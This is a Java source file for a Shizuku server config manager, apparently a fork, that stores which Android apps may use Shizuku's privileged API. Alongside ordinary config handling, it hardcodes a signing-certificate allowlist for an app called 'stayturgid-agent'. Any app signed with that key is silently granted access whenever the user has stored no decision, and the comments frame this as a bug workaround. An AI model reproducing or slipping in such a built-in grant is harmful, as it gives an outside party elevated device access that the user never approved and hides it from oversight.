package rikka.shizuku.server;

import static rikka.shizuku.server.ServerConstants.PERMISSION;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Build;
import android.system.ErrnoException;
import android.system.Os;
import android.util.AtomicFile;

import androidx.annotation.Nullable;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

import kotlin.collections.ArraysKt;
import af.shizuku.common.compat.Android17Compat;
import af.shizuku.common.compat.InstalledPackagesCompat;
import af.shizuku.common.util.UserHandleCompat;
import rikka.hidden.compat.PackageManagerApis;
import rikka.hidden.compat.UserManagerApis;
import rikka.shizuku.server.ktx.HandlerKt;

public class ShizukuConfigManager extends ConfigManager {

    private static final Gson GSON_IN = new GsonBuilder()
            .create();
    private static final Gson GSON_OUT = new GsonBuilder()
            .setVersion(ShizukuConfig.LATEST_VERSION)
            .create();

    private static final long WRITE_DELAY = 10 * 1000;

    private static final File FILE = getConfigFile();
    private static final AtomicFile ATOMIC_FILE = new AtomicFile(FILE);

    private static File getConfigFile() {
        File shellFile = new File("/data/user_de/0/com.android.shell/shizuku.json");
        if (shellFile.exists()) {
            return shellFile;
        }
        try {
            File parent = shellFile.getParentFile();
            if (parent != null && parent.exists() && parent.canWrite()) {
                return shellFile;
            }
        } catch (Throwable ignored) {}
        return new File("/data/local/tmp/shizuku.json");
    }


    /**
     * SHA-256 fingerprints (lowercase hex, no colons) of APK signing certificates that are always
     * granted Shizuku access, regardless of what is (or isn't) persisted in the config file.
     *
     * Works around a gap in the reconciliation loop in the constructor: on every server start it
     * drops a UID's entry the moment the live package set for that UID differs from what was last
     * persisted — including a transient/inconsistent read during an unrelated install or uninstall
     * elsewhere on the device — so a trusted app's grant can silently disappear and must be
     * re-approved by hand. See docs/trusted-signer-allowlist.md.
     *
     * Keyed by signing certificate, not package name or UID: a package-name allowlist is defeated
     * by installing another app under that name once the real one is gone, and UIDs are reassigned
     * across installs. This must never be a shared/debug keystore.
     */
    private static final Set<String> TRUSTED_SIGNER_SHA256 = new LinkedHashSet<>(List.of(
            // stayturgid-agent release signing key (CN=StayTurgid, O=StayTurgid, C=US).
            "6651cb1582a2ab9f83bc8203da4e4591bc76ef187e8b4c771dcc7a9768be293e"
    ));

    public static ShizukuConfig load() {
        FileInputStream stream;
        try {
            stream = ATOMIC_FILE.openRead();
        } catch (FileNotFoundException e) {
            LOGGER.i("no existing config file " + ATOMIC_FILE.getBaseFile() + "; starting empty");
            return new ShizukuConfig();
        }

        ShizukuConfig config = null;
        try {
            config = GSON_IN.fromJson(new InputStreamReader(stream), ShizukuConfig.class);
        } catch (Throwable tr) {
            LOGGER.e(tr, "load config");
        } finally {
            try {
                stream.close();
            } catch (IOException e) {
                LOGGER.w("failed to close: " + e);
            }
        }
        if (config != null) return config;
        return new ShizukuConfig();
    }

    public static void write(ShizukuConfig config) {
        synchronized (ATOMIC_FILE) {
            FileOutputStream stream;
            try {
                stream = ATOMIC_FILE.startWrite();
            } catch (IOException e) {
                LOGGER.e("failed to write state: " + e);
                return;
            }

            try {
                String json = GSON_OUT.toJson(config);
                stream.write(json.getBytes());

                ATOMIC_FILE.finishWrite(stream);

                // Closing #419: the config file was previously world-readable/writable.
                // Root bypasses DAC checks entirely, so it doesn't need explicit bits here;
                // only shell needs explicit access, granted via group ownership. No "other"
                // access is needed, so we restrict to owner+group read/write only.
                File file = ATOMIC_FILE.getBaseFile();
                if (file.exists()) {
                    try {
                        Os.chmod(file.getAbsolutePath(), 0660);
                        Os.chown(file.getAbsolutePath(), -1, android.os.Process.SHELL_UID);
                    } catch (ErrnoException e) {
                        LOGGER.w("failed to set permissions on " + file.getAbsolutePath() + ": " + e);
                    }
                }
                LOGGER.v("config saved to " + file.getAbsolutePath());
            } catch (Throwable tr) {
                LOGGER.e(tr, "can't save %s, restoring backup.", ATOMIC_FILE.getBaseFile());
                ATOMIC_FILE.failWrite(stream);
            }
        }
    }

    private final Runnable mWriteRunner = new Runnable() {

        @Override
        public void run() {
            write(config);
        }
    };

    private final ShizukuConfig config;

    public ShizukuConfigManager() {
        this.config = load();

        boolean changed = false;

        if (config.packages == null) {
            config.packages = new ArrayList<>();
            changed = true;
        }

        Map<Integer, List<String>> packagesByUid = new HashMap<>();
        List<PackageInfo> allPackages = new ArrayList<>();

        for (int userId : UserManagerApis.getUserIdsNoThrow()) {
            for (PackageInfo pi : InstalledPackagesCompat.getInstalledPackagesNoThrow(PackageManager.GET_PERMISSIONS, userId)) {
                if (pi == null || pi.applicationInfo == null) continue;
                allPackages.add(pi);

                List<String> list = packagesByUid.get(pi.applicationInfo.uid);
                if (list == null) {
                    list = new ArrayList<>();
                    packagesByUid.put(pi.applicationInfo.uid, list);
                }
                list.add(pi.packageName);
            }
        }

        if (packagesByUid.isEmpty()) {
            LOGGER.w("packagesByUid is empty, skipping config pruning to avoid wiping authorizations");
            return;
        }

        for (ShizukuConfig.PackageEntry entry : new ArrayList<>(config.packages)) {
            if (entry.packages == null) {
                entry.packages = new ArrayList<>();
            }

            List<String> packages = packagesByUid.get(entry.uid);
            if (packages == null || packages.isEmpty()) {
                List<String> livePackages = rikka.hidden.compat.PackageManagerApis.getPackagesForUidNoThrow(entry.uid);
                if (livePackages != null && !livePackages.isEmpty()) {
                    packages = livePackages;
                    packagesByUid.put(entry.uid, livePackages);
                } else {
                    LOGGER.i("remove config for uid %d since it has gone", entry.uid);
                    config.packages.remove(entry);
                    changed = true;
                    continue;
                }
            }

            if (entry.packages.isEmpty()) {
                // Entries created via the plain toggle path (updateFlagsForUid) used to be
                // written with no package names at all - that's missing data, not evidence this
                // uid's packages changed. Treating it as "changed" pruned a still-valid
                // authorization on every server restart, and separately made getApplications()
                // exclude the package from the authorized list on the very next refresh (its
                // membership check on this same empty list always fails). Backfill from the
                // live package list instead.
                LOGGER.i("backfilling empty packages list for uid %d from current package manager state", entry.uid);
                entry.packages.addAll(packages);
                changed = true;
                continue;
            }

            boolean packagesChanged = true;

            for (String packageName : entry.packages) {
                if (packages.contains(packageName)) {
                    packagesChanged = false;
                    break;
                }
            }

            final int rawSize = entry.packages.size();
            Set<String> s = new LinkedHashSet<>(entry.packages);
            entry.packages.clear();
            entry.packages.addAll(s);
            final int shrunkSize = entry.packages.size();
            if (shrunkSize < rawSize) {
                LOGGER.w("entry.packages has duplicate! Shrunk. (%d -> %d)", rawSize, shrunkSize);
            }

            if (packagesChanged) {
                LOGGER.i("remove config for uid %d since the packages for it changed", entry.uid);
                config.packages.remove(entry);
                changed = true;
            }
        }

        for (PackageInfo pi : allPackages) {
            if (pi.requestedPermissions == null) {
                continue;
            }

                String activePerm = null;
                if (ArraysKt.contains(pi.requestedPermissions, PERMISSION)) activePerm = PERMISSION;
                else if (ArraysKt.contains(pi.requestedPermissions, ServerConstants.PERMISSION_LEGACY)) activePerm = ServerConstants.PERMISSION_LEGACY;
                else if (ArraysKt.contains(pi.requestedPermissions, ServerConstants.PERMISSION_ORIGINAL)) activePerm = ServerConstants.PERMISSION_ORIGINAL;

                if (activePerm == null) continue;

                int uid = pi.applicationInfo.uid;
                boolean allowed;
                try {
                    allowed = Android17Compat.checkPermission(activePerm, uid) == PackageManager.PERMISSION_GRANTED;
                } catch (Throwable e) {
                    LOGGER.w("checkPermission");
                    continue;
                }

                if (allowed) {
                    List<String> packages = new ArrayList<>();
                    packages.add(pi.packageName);
                    updateLocked(uid, packages, ConfigManager.MASK_PERMISSION, ConfigManager.FLAG_ALLOWED);
                    changed = true;
                }
        }

        if (changed) {
            scheduleWriteLocked();
        }
    }

    private void scheduleWriteLocked() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (HandlerKt.getWorkerHandler().hasCallbacks(mWriteRunner)) {
                return;
            }
        } else {
            HandlerKt.getWorkerHandler().removeCallbacks(mWriteRunner);
        }
        HandlerKt.getWorkerHandler().postDelayed(mWriteRunner, WRITE_DELAY);
    }

    private ShizukuConfig.PackageEntry findLocked(int uid) {
        for (ShizukuConfig.PackageEntry entry : config.packages) {
            if (uid == entry.uid) {
                return entry;
            }
        }
        return null;
    }

    @Nullable
    public ShizukuConfig.PackageEntry find(int uid) {
        ShizukuConfig.PackageEntry entry;
        synchronized (this) {
            entry = findLocked(uid);
        }
        // Any persisted decision wins, including the manager's "revoke", which stores an entry
        // with neither flag set. The signer default only fills the gap left when reconciliation
        // dropped the entry or nothing was ever decided; it is not a way around the user.
        if (entry == null && isTrustedSignerUid(uid)) {
            return new ShizukuConfig.PackageEntry(uid, ConfigManager.FLAG_ALLOWED);
        }
        return entry;
    }

    /**
     * True if any package currently installed under {@code uid} is signed by a certificate in
     * {@link #TRUSTED_SIGNER_SHA256}. Fails closed: any error, including the missing
     * SigningInfo class below API 28, means "not trusted", never a crashed server.
     */
    private boolean isTrustedSignerUid(int uid) {
        if (TRUSTED_SIGNER_SHA256.isEmpty() || Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            return false;
        }
        try {
            int userId = UserHandleCompat.getUserId(uid);
            for (String packageName : PackageManagerApis.getPackagesForUidNoThrow(uid)) {
                PackageInfo pi = Android17Compat.getPackageInfo(
                        packageName, PackageManager.GET_SIGNING_CERTIFICATES, userId);
                if (pi == null || pi.signingInfo == null) {
                    continue;
                }
                for (Signature signature : pi.signingInfo.getApkContentsSigners()) {
                    String digest = sha256Hex(signature.toByteArray());
                    if (digest != null && TRUSTED_SIGNER_SHA256.contains(digest)) {
                        return true;
                    }
                }
            }
        } catch (Throwable t) {
            LOGGER.w(t, "trusted signer lookup failed for uid " + uid);
        }
        return false;
    }

    @Nullable
    private static String sha256Hex(byte[] data) {
        try {
            byte[] hash = MessageDigest.getInstance("SHA-256").digest(data);
            StringBuilder sb = new StringBuilder(hash.length * 2);
            for (byte b : hash) {
                sb.append(String.format(Locale.ROOT, "%02x", b));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            LOGGER.w(e, "sha256");
            return null;
        }
    }

    public List<Integer> getAllowedUids() {
        synchronized (this) {
            List<Integer> result = new ArrayList<>();
            for (ShizukuConfig.PackageEntry entry : config.packages) {
                if ((entry.flags & ConfigManager.FLAG_ALLOWED) != 0) {
                    result.add(entry.uid);
                }
            }
            return result;
        }
    }

    private void updateLocked(int uid, List<String> packages, int mask, int values) {
        ShizukuConfig.PackageEntry entry = findLocked(uid);
        if (entry == null) {
            entry = new ShizukuConfig.PackageEntry(uid, mask & values);
            config.packages.add(entry);
        } else {
            int newValue = (entry.flags & ~mask) | (mask & values);
            if (newValue == entry.flags) {
                return;
            }
            entry.flags = newValue;
        }
        if (packages != null) {
            for (String packageName : packages) {
                if (entry.packages.contains(packageName)) {
                    continue;
                }
                entry.packages.add(packageName);
            }
        }
        scheduleWriteLocked();
    }

    public void update(int uid, List<String> packages, int mask, int values) {
        synchronized (this) {
            updateLocked(uid, packages, mask, values);
        }
    }

    private void removeLocked(int uid) {
        ShizukuConfig.PackageEntry entry = findLocked(uid);
        if (entry == null) {
            return;
        }
        config.packages.remove(entry);
        scheduleWriteLocked();
    }

    public void remove(int uid) {
        synchronized (this) {
            removeLocked(uid);
        }
    }
}
